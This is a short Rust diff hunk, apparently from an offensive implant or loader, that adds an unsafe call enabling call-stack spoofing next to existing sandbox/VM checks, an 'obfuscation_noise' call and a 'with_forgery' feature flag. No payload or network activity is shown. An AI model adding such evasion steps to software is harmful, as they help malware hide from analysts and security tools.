@@ -49,6 +49,8 @@ fn main() {
     #[cfg(feature = "sandbox")]
     guard::guard_vm();
 
+    unsafe { guard::spoof::enable_stack_spoof(); }
+
     obfuscation_noise();
 
     #[cfg(feature = "with_forgery")]
